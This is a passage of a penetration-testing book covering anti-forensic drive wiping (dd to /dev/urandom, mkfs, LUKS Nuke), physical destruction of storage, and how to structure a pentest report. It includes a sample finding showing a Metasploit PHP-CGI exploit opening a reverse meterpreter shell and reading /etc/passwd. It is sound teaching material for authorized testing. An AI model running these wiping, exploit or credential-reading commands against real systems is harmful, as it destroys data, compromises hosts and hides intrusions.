- pgno: 222
  md: '![](img/095df2cd1930baecbcecaa51ee3417aa_222_0.png)


    # Using DD and mkfs to clear drives


    The one important thing to note is that deleting a file doesn''t actually delete
    a file. We talked about this earlier with shred. So, if you want to truly delete
    and need another option to shred, DD is your answer. This utility allows us to
    copy files to a destination of our choice. However, we can use this utility to
    write random data as well to any partition. In the following command, I will write
    random characters to the partition of my choice. This will make sure that the
    data that was there was actually overwritten as opposed to just having the pointers
    removed:


    ```

    dd if=/dev/urandom of=/dev/sda2

    ```


    The main difference between the preceding command and the command we used to copy
    partitions is that the input file is an actual file as opposed to /dev/urandom.
    Along the same lines as dd, we can also just reformat the partition with a new
    filesystem as well using the mkfs.ext4. To accomplish this on the preceding partition,
    the similar command will be as follows:


    ```

    Mkfs.ext4 /dev/sda2

    ```


    There are many options to hide your tracks using the command line. Make sure you
    understand the pros and cons of each to help you make an informed decision.'
  merge: -1
  img_proc: true
- pgno: 223
  md: '# LUKS Nuke blowing up partition


    So far, we talked about options to hide our tracks by shredding, removing lines
    within the files, or deleting files themselves. We also talked about overwriting
    partitions. These all have their pros and cons, but what happens if you want to
    accomplish this at a specific time with a specific keyword? Well, then things
    can get quite tricky. This is where LUKS Nuke comes in. This allows you the ability
    to send over a signal to a remote host to let it know to nuke itself, sort of
    a remote kill signal.


    LUKS Nuke accomplishes this by working with LVM and disk encryption. When the
    machine boots, you need to enter a password. If you enter the nuke password, the
    machine will delete all the saved keys that will basically render all the data
    inaccessible. This has been implemented into Kali since version 1.06. This is
    an easy way to make sure your data is protected and lets you nuke without having
    to fully log in. This is a great safeguard for users, especially those that may
    have sensitive information on them, such as penetration testers.


    ![](img/095df2cd1930baecbcecaa51ee3417aa_223_0.png)


    For some more great links explaining LUKS Nuke in much more detail, check out
    the following links:


    ```

    https://www.kali.org/tutorials/nuke-kali-linux-luks/

    http://www.zdnet.com/article/developers-mull-adding-data-nuke-to-kali-linux/

    ```


    LUKS Nuke is a great little addition to help protect your personal data as well
    as any client data you may have.


    # Destroying equipment


    Sometimes equipment must be destroyed after an engagement. This could be because
    of a policy that requires it, or it could be just a precaution since sensitive
    data may reside on some of the systems. Either way, sometimes the need for destroying
    equipment may come up and be part of the negotiations during the stakeholder meeting.


    # Stakeholder-sponsored destruction


    Many organizations, especially if they are security conscious, may require any
    physical equipment that may leave their environment to be physically destroyed.
    This was most likely talked about during the stakeholder meetings. You, as a responsible
    penetration tester, need to make sure that this task is followed out to the stakeholders''
    exact requirement. Chain of custody may be brought up at this point as well.'
  merge: -1
  img_proc: true
- pgno: 224
  md: 'A chain of custody is a series of documents that show secure possession and
    secure transfer of any IT hardware in its most simple form. Any time a piece of
    hardware is taken offsite for destruction, the whole process from point A to point
    B needs to be fully documented. Some destruction companies will even record the
    whole process to make sure that the company can also see the entire process.


    If you are working for a company that requires this type of activity to happen,
    it''s not a bad idea to create a form to present to them during the initial meetings.
    This way, they will understand the process and see that you are taking this sensitive
    data very seriously.


    The following is an example of a chain of custody form for hardware destruction.
    Feel free to use and modify anything that pertains to specific customer requirements:


    ![](img/095df2cd1930baecbcecaa51ee3417aa_224_0.png)'
  merge: -1
  img_proc: true
- pgno: 225
  md: '# Destruction by the penetration tester


    Even though the company you are performing the penetration test against may not
    have a specific policy, it may be in your best interest to destroy any equipment
    that was onsite at a customer location just to be safe. We talked about a lot
    of software ways to destroy the data but physical may be an option as well.


    The most important items to think about destroying would be the places where data
    may reside. This would be any non-volatile storage such as a flash disk, SSD,
    and hard drive. If these devices get into the wrong hands, the data that is contained
    on these devices may be stolen if the devices are not destroyed correctly.


    How we destroy the device will ultimately depend on the type of device that it
    is. For any device, you can have them shredded. This will make them into a big
    pile of shavings similar to the following image. This will work with pretty much
    any device:


    ![](img/095df2cd1930baecbcecaa51ee3417aa_225_0.png)


    You can also drill holes into the drive. The following is a hard drive from my
    lab that I destroyed by drilling holes into it. Shredding it would have been much
    more fun, but I didn''t have access to the right equipment:'
  merge: -1
  img_proc: true
- pgno: 226
  md: '![](img/095df2cd1930baecbcecaa51ee3417aa_226_0.png)


    Finally, since I have a couple of Raspberry Pis that I use for various functions,
    I tend to physically destroy the microSD cards after each customer engagement.
    This way, I can assure the client that I do not have any of their data and I am
    not taking it with me. Here is one of my microSD card that I shattered into many
    pieces prior to me leaving one of my customer engagements:


    ![](img/095df2cd1930baecbcecaa51ee3417aa_226_1.png)'
  merge: -1
  img_proc: true
- pgno: 227
  md: '# Summary


    We are now done with the chapter, so let us recap. Since we completed all the
    penetration tests that were required for our engagement, we need to make sure
    that we clean up any mess we made, just like our mothers have taught us. It is
    important as professionals to make sure that we leave the environment the same
    as it was before we started and leave no tracks behind. To accomplish this, we
    talked about various items that we should be certain get done, basically, a cleaning-up
    list. To accomplish this, we talked about utilities to hide our tracks, for example,
    shred, dd, ClearLogs, and cleanenv. They all have various specialties on where
    and when to use and all of them should be in the penetration tester''s toolbox.


    Next, since physical destruction may be necessary depending on the stakeholders''
    requirement and/or data sensitivity level, we talked about the various ways we
    can physically destroy our hardware. However, in some cases we may need to engage
    a third-party hardware destruction company, so we talked about the chain of custody
    and I even included a form that can be used for making sure everything is completed
    as required by the appropriate parties.


    In the next chapter, I will talk about the last topic in this book: writing up
    the penetration testing report. This will be the culmination of all the chapters
    and tests that we ran. All information that we have collected will be put into
    a very detailed report and sent over to the stakeholders that have funded the
    penetration test.


    I will go over the various items to include in the report as well as my preferred
    syntax and layout, to name just a few. This report will be your deliverable, so
    it needs to be the best it can be to reflect how great a job you did. We definitely
    want to make sure it contains great information so that we can show our value
    as penetration testers to the stakeholders.'
  merge: -1
  img_proc: true
- pgno: 228
  md: '# 10


    # Writing Up the Penetration Testing Report


    This final day marks the culmination of the penetration test. It has been 9 days
    of different topics to learn and lab around with. Up until now, we were concerned
    with various utilities to test various portions of the company for any security-related
    vulnerabilities or gaps. All these activities provided us with the necessary information
    and evidence that we needed. Today, we are concerned with taking all the evidence
    and findings and formulating it into our final deliverable to the customer — the
    penetration testing report.


    In this section, we will talk about how to get the penetration testing report
    created. Starting with gathering all that data we generated, to talking about
    the actual structure of the finalized report, to finally building and then delivering
    the final product. The structure and layout of the report are my personal preference
    based on experience on both sides of the report (sometimes the tester, sometimes
    the stakeholder) as well as the receiver from third-party audits. Because of this,
    I have gained some important experience in what I have seen to be the most effective
    way to show the data. However, as you perform reports and talk with stakeholders,
    you yourself will gain this valuable insight and customize your structure and
    flow based on what your perceptions are. This is totally acceptable, as these
    reports tend to be very personal.


    The following topics will be discussed in this chapter:


    +   - Gathering all your data

    +   - Importance of defining risk

    +   - Structure of a Penetration Test Report Building the report

    +   - Delivering the report'
  merge: -1
  img_proc: true
- pgno: 229
  md: '# Gathering all your data


    Now that all the tests have been performed and evidence has been collected, it
    is time to gather all of our data. Hopefully, you have been keeping it well organized
    on your C&C server, as that will make the entire process much easier. Typically,
    I start the entire process by breaking down the data into three parts. This will
    start the process of getting me to that final structure that will allow me to
    turn all that data into the finalized product.


    Here are the first three categories I break the information down into:


    +   - Reports

    +   - Diagrams

    +   - Vulnerability/findings information


    I then take the vulnerability evidence that contains screenshots, scripts, and
    notes and move them into their respective vulnerabilities, sorted by the vulnerability.
    This allows for an easier migration to writing.


    For example, looking back on the Chapter 8, Web Application Attacks, I would typically
    break down the vulnerabilities from Chapter 4, Vulnerability Scanning and Metasploit,
    vulnerability evidence into these categories:


    +   - Web application vulnerabilities

    +   - Client-side vulnerabilities

    +   - Infrastructure vulnerabilities

    +   - Design vulnerabilities

    +   - Identity vulnerabilities

    +   - Session management vulnerabilities

    +   - Validation vulnerabilities

    +   - Error-handling vulnerabilities

    +   - Logic vulnerabilities'
  merge: -1
  img_proc: true
- pgno: 230
  md: 'After this step, I refine all the vulnerability evidence one more time. This
    time into the actual vulnerability. For instance, taking one of the preceding
    categories, client-side vulnerabilities, I would break it down into an actual
    issue at hand:


    +   - Web application vulnerabilities

    +   - Client-side vulnerabilities

    +   - Reflected XSS vulnerabilities

    +   - Stored XSS vulnerabilities


    Then, I will take all the relevant evidence and put it in the preceding classifications.
    This will allow me to group common vulnerabilities if they exist in more than
    one place. A great example of this would be that I have multiple different web
    applications in different locations all susceptible to a stored XSS attack.


    Once all the evidence is organized, you will see that it truly makes the process
    of generating the report much easier.


    # Importance of defining risk


    Defining risk is pretty much the entire reason why penetration tests are performed.
    Risk defines how impactful or unaffecting a particular vulnerability is within
    a defined environment.


    Typically, the risk is defined in accordance with NIST SP 800-30. This document
    is a great guideline for conducting risk assessments. It contains all the fundamentals
    of risk information, including the risk management process, risk assessment, important
    risk concepts, and applications for risk assessments. It then dives into the actual
    risk assessment process from preparing to conducting, to communicating, and finally
    maintaining the risk assessment. Keep in mind, risk can be specific to an individual,
    a company, or situation. For example, if a customer has a default instance of
    MySQL with default passwords running on a development box somewhere that is segmented
    from everything else, it will not be the same risk level as that same instance
    running in production.'
  merge: -1
  img_proc: true
- pgno: 231
  md: 'The following chart does a fantastic job to show how risk is influenced by
    key risk factors, for example, the risk (or likelihood) that a particular event
    from a particular source will have an adverse impact on the organization:


    ![](img/095df2cd1930baecbcecaa51ee3417aa_231_0.png)


    To come up with a particular risk for a vulnerability or finding, we take the
    vulnerability and run it through a chart similar to the following one designed
    by NIST. Based on this outcome, we can assign the category or number using our
    defined risk chart:


    ![](img/095df2cd1930baecbcecaa51ee3417aa_231_1.png)'
  merge: -1
  img_proc: true
- pgno: 232
  md: 'Another way of looking at risk, and this is by far my favorite NIST chart concerning
    risk, is by looking at the overall likelihood chart. This chart takes two different
    inputs. The first is the likelihood of an event occurring. The second input is
    the likelihood that an event will result in adverse impacts. The answer is your
    risk or likelihood:


    | Likelihood of Threat Event Initiation or Occurrence | Likelihood Threat Events
    Result in Adverse Impacts |  |  |  | |

    | | Very Low | Low | Moderate | High | Very High |

    | Very High | Low | Moderate | High | Very High | Very High |

    | High | Low | Moderate | Moderate | High | Very High |

    | Moderate | Low | Low | Moderate | Moderate | High |

    | Low | Very Low | Low | Low | Moderate | Moderate |

    | Very Low | Very Low | Very Low | Low | Low | Low |


    The chart can seem confusing at first, but when you think of an example and apply
    it to this chart, it all makes perfect sense. Let us take an example to show the
    chart''s usage. Say we have an SSH vulnerability on a remote test server somewhere.
    If the threat event occurred, the impact would be high. However, SSH is firewalled
    and only allowed by one single IP address. The likelihood of this threat event
    initiating or occurring is very low since the attack is minimized by a few addresses
    allowed to the box over SSH. Based on all this, we can see that the total risk
    would be low. The great thing about this chart is that it can really show the
    power if you take this same example and apply it to another environment. Based
    on the initial assessment, we know that if this SSH vulnerability happened, the
    impact would be high. Now, let us say this environment, unlike the first, has
    SSH open to the whole world. Now, the likelihood of this event happening is very
    high.


    Based on this information, we can see that this vulnerability has a very high
    risk in this environment, even though in another environment it was listed as
    low. This shows the power of defining risk. This chart is a great reference and
    should be the basis for determining risk within an environment.'
  merge: -1
  img_proc: true
- pgno: 233
  md: '# Structure of a penetration test report


    The structure of a penetration test can vary tremendously from person to person.
    Everyone has their own thoughts and ideas as to what should be there, what shouldn''t
    be there, and how to word it. I don''t believe there is any right answer as to
    a penetration testing report needs to look a specific way and only that way. To
    me, as long as you are delivering what you promised during those initial stakeholder
    meetings, then you should be fine. However, notice I said fine and not great.
    I have gotten penetration testing reports from places that checked off all the
    boxes in terms of delivering what they promised, but it was evident that the content
    and thought in the reports was not thorough and complete. We will talk more about
    this in the Building the report section.


    Now, as for the structure of the penetration testing report, I tend to put certain
    sections in all my reports, regardless of the size of the engagement. These are
    the sections along with some information about what I put in them and why I believe
    they should be in every penetration report.


    ![](img/095df2cd1930baecbcecaa51ee3417aa_233_0.png)


    These don’t necessarily have to be what you put in yours. Make them your own living
    document and experiment and explore options that you would find useful if you
    were on the other end of the report. Remember, one size doesn’t fit all.


    # Cover sheet


    The cover sheet might not seem too important, but it does set the tone for the
    entire report. It is the first thing the stakeholders will see, so it needs to
    look good. It should have the appropriate logos on it, both yours and the company
    you''re running the tests against. Make sure that the logos are sized correctly
    and look good, not just something that you cut out from their website. Marketing
    yourself correctly will not only help grow your individual brand but also draw
    the stakeholders into wanting to read the report.


    Pertinent information such as a high-level name of the work that was performed.
    For example, was it "Penetration Testing of Corporation ABC Headquarters" or was
    it something more like "Web Application Report for Corporation ABC"? This sets
    the landscape of the report for the user, or better yet, the desired audience
    and scope. If the user doesn''t deal with the web application side of the house,
    then the last option will not pertain to them, and therefore they won''t read
    it.


    The last major piece of information that I always include is the time line. For
    example, if I am running yearly tests, then I would put something like "Annual
    2017 Report". If I ran these tests on a quarterly basis, then the report would
    be something like "Quarter 1 2017 Report". This helps set the overall time line
    of the report.'
  merge: -1
  img_proc: true
- pgno: 234
  md: '# Table of contents


    Like any good and thorough document, a table of contents is necessary. These reports
    can grow quite large in length, depending on the scope and timeline of the engagement.
    Also, how secure or insecure the environment is can play an extremely important
    part in how long the report ends up being. But nonetheless, you need the reader
    to be able to see where the information is contained within the report without
    having to scroll through each page to find, for example, the definition of the
    various risk levels. Make sure that the table of contents contains page numbers
    for this exact reason. You definitely don''t have to get too deep on what constitutes
    getting onto the table of contents as opposed to just getting rolled into a larger
    section. However, to me, if it''s a key differentiation from the prior section,
    it should be duly noted within the table of contents.


    # Executive summary


    The executive summary is just that, a summary designed for a high-level executive.
    It should be a brief overview of the project, including the who, what, where,
    when, and a very high-level how. There shouldn''t be any specific tests or software
    tools talked about here. I always give a high-level view of the results, as well
    as my recommendations but nowhere near the depth that I will explain in the Detailed
    findings section. Also, since there may be a security disconnect depending on
    the security understanding of the organization, I do express any urgencies or
    priorities that may need to be expressed. This is typically how I conclude my
    executive summary.


    # The scope of the project


    For this section, I reiterate the scope that we talked about with the stakeholders
    during our initial meetings. This includes things such as locations tested, IP
    space profiled, applications involved, and type of penetration testing (for example,
    external or internal). This way, anyone who reads the report understands what
    was tested as well as why it was tested and possibly what wasn''t tested. For
    example, we may state that the scope of the penetration test was our Miami location
    and that the web applications for our online customer relations application were
    in scope for this test. We also need to mention any constraints that were put
    on the project, including items such as time frame, resources allocated, and budget
    of the company. All these items affect the scope of what we did as penetration
    testers. This section will help lay out the entire report.'
  merge: -1
  img_proc: true
- pgno: 235
  md: '# Objectives of the penetration test


    For the objectives section of the penetration test, the goal here is to just go
    over the reason or reasons why we were engaged in the penetration test. For example,
    was there a breach in the network or within an application that caused us to get
    engaged? Or, was this part of an initiative to start accepting credit cards and
    need to become PCI compliant? Always make sure you explain how your services will
    help you achieve the company objectives and goals.


    ![](img/095df2cd1930baecbcecaa51ee3417aa_235_0.png)


    Make sure you address all the objectives from the original scoping document and
    stakeholder meetings. It is important that everything that was originally promised
    got done.


    # Description of risk rating scale


    Risk plays a huge role in a penetration test, but it also plays a big role in
    how the company proceeds after the test is complete. I have seen instances where
    only the medium-to-high-risk rated events were looked at. Therefore, it is really
    important to clearly define your risk rating scale and explain each of the different
    levels thoroughly. You never want to leave any risk level open for interpretation,
    as this could lead to confusion and, possibly, the wrong remediation path for
    the customer.


    The criticality levels and how they are defined are open to interpretation. You
    can create your own or use the ones that have already been defined.


    ![](img/095df2cd1930baecbcecaa51ee3417aa_235_1.png)


    If you do choose to use your own risk rating chart, be consistent and use it throughout
    all your engagements. If you switch back and forth between charts, you can leave
    both yourself and your customer confused. This inconsistency can hurt you, especially
    if you end up doing recurring tests for the same customer. Something could be
    extreme in one chart and high in another, and switching terms can just lead to
    confusion.


    I use the risk chart defined by Penetration Testing Execution Standard, as I have
    found it to be the most thorough. The following copy of this risk chart is for
    you to review:'
  merge: -1
  img_proc: true
- pgno: 236
  md: '# Information Security Risk Rating Scale


    | Level | Description |

    |---|---|

    | **Extreme** 13-15 | Extreme risk of security controls being compromised with
    the possibility of catastrophic financial losses occurring as a result |

    | **High** 10-12 | High risk of security controls being compromised with the potential
    for significant financial losses occurring as a result |

    | **Elevated** 7-9 | Elevated risk of security controls being compromised with
    the potential for material financial losses occurring as a result |

    | **Moderate** 4-6 | Moderate risk of security controls being compromised with
    the possibility of limited financial losses occurring as a result |

    | **Low** 1-3 | Low risk of security controls being compromised with measurable
    negative impacts as a result |


    There are a couple of things I like about this chart. First, there are a good
    number of levels. I find some charts have too few options. For example, using
    low, medium, and high doesn''t do risk any justification. If a finding is really
    bad and needs to be fixed immediately and another finding is bad and needs fixing
    sooner rather than later, given a chart, one would be high and the other medium.
    To me, that medium would get overlooked and potentially never updated. The medium
    doesn''t have the same sense of urgency as high or extreme.


    The other thing I like about this chart is the colors that are used. They are
    colors that have very similar meanings in other applications. For example, red
    tends to be the worst. In monitoring applications, red is typically a down situation.
    Or, when driving, it means to stop moving. Similar to red, yellow has a similar
    meaning in other applications. Yellow in monitoring systems typically means something
    is wrong but not down. It may be having some packet loss but is still reachable.
    In driving, it means to be cautious. You can still drive and move through the
    intersection, but be careful as the red light is coming very soon. And finally,
    there is green. Using that similar example from the past, green tends to be on
    the opposite side of the spectrum whether we are talking driving or server monitoring
    applications.'
  merge: -1
  img_proc: true
- pgno: 237
  md: 'The last thing I like about this chart is the number reference. If we have
    individuals reviewing these reports who are color-blind, they will not get a true
    representation of the severity levels since they may not be able to decipher the
    colors. The numbers allow us to also show scale without color. The bigger number
    is a bigger threat, while the smaller number is a smaller threat. It is always
    important to not take for granted that everyone can see the color chart.


    # Summary of findings


    This is very similar to the executive summary in terms of the audience level.
    This should be a relatively small section that includes a high-level summary of
    what was found. I tend to favor a graphic that displays what is found. A picture
    is worth 1,000 words, and I completely agree with this statement. A color-coded
    pie chart with a breakdown of the risks will very quickly summarize the urgency
    of the report. Use the same language and classification as you use for the risk
    rating, as well as color coding. Consistency is key. Be sure to only state the
    facts here and not any opinionated statements. This is really just high-level
    facts.


    ![](img/095df2cd1930baecbcecaa51ee3417aa_237_0.png)


    Some penetration testers prefer to show a summary of the tests performed as opposed
    to the risk. It is really up to the penetration tester and what they believe that
    adds more value. To me, the summary of the risk adds more value, especially to
    the higher-level executives. They don’t tend to want to understand or need to
    understand how many design flaws or missing patches exist on servers but more
    so on what the overall risk is to the business.


    Here is an example of the graphic type that I tend to use, again keeping the same
    look and feel as discussed earlier:'
  merge: -1
  img_proc: true
- pgno: 238
  md: '# Summary of Findings


    ![](img/095df2cd1930baecbcecaa51ee3417aa_238_0.png)


    # Detailed findings


    This section is the heart of the penetration testing report. It will list all
    the findings that were uncovered during our various tests, sorted by the highest
    risk first. This section should be technical and include as much detail as possible.
    This will be the section that more technical audience peels through to grab a
    better understanding of what the issue is and how to potentially remediate it.
    That''s an important statement right there that I just stated. I always include
    a section within the vulnerability on either my recommendation or remediation
    option.


    ![](img/095df2cd1930baecbcecaa51ee3417aa_238_1.png)


    Sometimes vulnerabilities or findings are very similar in look and feel. As a
    security professional, and the one performing the test, I tend to have a more
    intimate knowledge of the issue at hand. Because of this, I will always explain
    my recommendation or remediation option. I don’t want to leave it up to the client
    to try and figure it out, as sometimes they may pick the wrong remediation.'
  merge: -1
  img_proc: true
- pgno: 239
  md: 'The format can vary quite a lot across penetration testers or security companies
    for this section. You could have all the findings in a chart of some type, in
    paragraph form, embedded within a graphic, or in a table format. To each their
    own. I like the table format the best.


    In this table format, each main piece will be a vulnerability or finding. That
    way, it will take the major focus. Within that vulnerability, I will have the
    following information, the same for every vulnerability, with all fields filled
    out:


    +   - Vulnerability/finding name

    +   - Vulnerability/finding description

    +   - Risk rating on the environment

    +   - Detailed information about the vulnerability

    +   - Recommendations/remediation

    +   - External CVE or other references


    Again, feel free to customize the flow, names, and so on. However, make sure that
    the data that is given is relevant for the client, in a language the client can
    understand, and offers remediation information as well.


    Depending on the vulnerability and evidence that I obtain from the testing, I
    will include items such as screenshots, diagrams, and attack scenarios. Here is
    an example from one of the tests in my lab:


    ```

    PHP-CGI Argument Injection

    ```


    Description: A vulnerability exists in certain versions of PHP that will allow
    arguments to be injected within a query string, and then passed to CGI, and eventually
    remote code execution.


    Severity: High (12)


    Detailed Explanation: During a vulnerability assessment on this particular web
    server that was in scope and located at 192.168.33.21, the PHP version was flagged
    with this vulnerability. Upon this finding, a verified attack was attempted. Using
    msfconsole within the Metasploit framework, I used the following exploit that
    matched the found vulnerability:


    ```

    exploit/multi/http/php_cgi_arg_injection

    ```'
  merge: -1
  img_proc: true
- pgno: 240
  md: 'Upon loading this exploit and setting my RHOST variable to the remote host,
    I was able to open up a meterpreter session, as follows:


    ```

    msf exploit(php_cgi_arg_injection) > exploit


    [*] Started reverse TCP handler on 192.168.87.129:4444

    [*] Sending stage (34122 bytes) to 192.168.87.130

    [*] Meterpreter session 1 opened (192.168.87.129:4444 -> 192.168.87.130:33595)
    at 2017-01-27 10:15:00 -0500


    meterpreter >

    ```


    From that prompt, I was allowed to grab sensitive files on the remote machine
    as well as other potential malicious activity. The following screenshot verifies
    the ability to grab sensitive files:


    ```

    meterpreter > cat /etc/passwd

    root:x:0:0:root:/root:/bin/bash

    daemon:x:1:1:daemon:/usr/sbin:/bin/sh

    bin:x:2:2:bin:/bin:/bin/sh

    sys:x:3:3:sys:/dev:/bin/sh

    sync:x:4:65534:sync:/bin:/bin/sync

    games:x:5:60:games:/usr/games:/bin/sh

    ```


    +   - Recommendation, Remediations: Upgrade PHP to a non-affected patched version.
    This would include 5.4.3 and above.

    +   - External References: CVE-2012-1823 EDB-25986

    +     OSVDB-81633 OSVDB-93979


    This example ties it all together and gives the stakeholders high-level information
    for the C-level managers to make the appropriate decisions on whether to handle
    it or not, as well as the technical details for the employees on how to fix and
    how to test.


    # Conclusion


    The conclusion ties up all the loose ends and gives a final overview of the engagement
    as a whole. This section should include a synopsis of your engagement and why
    you were brought in. Also, make sure to restate the original goals of the penetration
    test. After all this is complete, make sure to reiterate how you met those original
    goals. Use a few specific examples to show how this was done and how these services
    added value to the organization. Always end the conclusion on a positive note
    and how you will continue your penetration testing services to help the customer
    maintain their security profile.'
  merge: -1
  img_proc: true
- pgno: 241
  md: '# Appendix A - tools used


    Within the appendix, I like to include all the various tools that I used, along
    with the versions. This will allow the company to understand the tools that were
    used for various attacks in case they want to perform similar tests internally.
    This shows tremendous value, in my opinion, to the stakeholders. Too many penetration
    testers let the customers know issues that exist, but don''t give them the tools
    to be able to make sure they can recreate them if necessary.


    What information you provide is up to you. I tend to include any hardware and
    software platforms that I used for testing. Included with that information is
    a list of tools, the version of those tools, and a description of those tools.
    The following is an example of the syntax that I use for my penetration reports:


    **Tools Used During the Penetration Test**

    **Platforms Used:**

    - Macbook Pro with VMWare Fusion running Kali Linux 64bit (2016.02)

    - Raspberry Pi 3 running Kali Linux 2.1.2

    - IBM Thinkstation running Kali Linux 64bit (2016.02)


    **Software Used:**

    - Metasploit (4.13.24) – Penetration Testing Software

    - Uniscan (6.3) – Vulnerability scanner

    - Skipfish (2.10b) – Web Application brute force tool

    - Wfuzz (2.1.3) – Web Application brute force tool

    - Sqlmap (1.1.2) – Web Application SQL Injection tool

    - Crunch (3.6) – Wordlist generator

    - John (1.8.0.6) – Password Cracking Utility

    - Hydra (8.3) – Password Cracking Utility

    - Ncrack (0.5) – Password Cracking Utility

    - Set (7.4.5) – Social Engineering Toolkit

    - Arpspoof (2.4) – Arp poisoning tool

    - Sslstrip (0.9) – SSL interception tool


    ![](img/095df2cd1930baecbcecaa51ee3417aa_241_0.png)


    What you include in the tools section is totally up to you. I tend to keep it
    simple and just list the tool, version, and a brief description. I have seen instances
    where the various attack scenarios are listed for each tool. Either way, having
    this section definitely helps out your customer by allowing them to understand
    the tools and platforms used so they can potentially replicate it.'
  merge: -1
  img_proc: true
- pgno: 242
  md: '# Appendix B - attached reports


    This section is designed to attach any report results that were run against the
    environment. These reports can include vulnerability assessment reports, Nmap
    scan reports, and password scans. Any scan that is run against the environment
    should be in here. Also, include reports based on items other than scans if applicable.
    For example, if you are doing a configuration audit with nipper-ng, attach this
    report as well. The point is to attach any report from any tool that you believe
    adds great value to the report and the stakeholders.


    ![](img/095df2cd1930baecbcecaa51ee3417aa_242_0.png)


    An extremely important piece of this section is to make the report your own, even
    if you are using a third-party tool. You want to show value to the stakeholders
    and giving them a report that is directly outputted from a tool will not show
    them much value. They can install that same tool and run that same report. I don’t
    know how many times I have received various reports from security professionals
    who didn’t bother to do this. Make the reports your own, and follow the theme
    you have set from the beginning of the document. Using the same canned reports
    can have the stakeholder question you and the report in general.


    Here is an example report from a lab penetration test. I ran a nipper report against
    one of my test switches. Now, in a real report, I would incorporate the output
    report data into my standard format but wanted to show here the option of attaching
    reports:


    ![](img/095df2cd1930baecbcecaa51ee3417aa_242_1.png)'
  merge: -1
  img_proc: true
- pgno: 243
  md: '# Appendix C - attached diagrams


    Along with the reports, it is great to include any diagrams that may have been
    developed by you or the team members within the organization to help support this
    test. This may help the company recreate testing scenarios as well as potentially
    just document something that they have never documented before. I have seen many
    penetration tests create documentation such as organization charts, data flow
    diagrams, or business process flow diagrams that the company has never documented
    before or at least a hard copy of it. A PCI data flow diagram I created earlier
    in the labs as part of the penetration test.


    # About your company


    This section is all about marketing your brand. You want to put a small amount
    of information about your company as well as what services it provides. Whoever
    performed the penetration test should have a small text blog about their professional
    experience as well as any certifications they may have. This will help anyone
    who reads the report understand who performed the tests and why they were qualified
    to do so. Always put your contact information as well in case anyone needs contact
    you in future for anything else, as well as any company certifications that may
    be held. It really should read like a 30-second commercial.'
  merge: -1
  img_proc: true
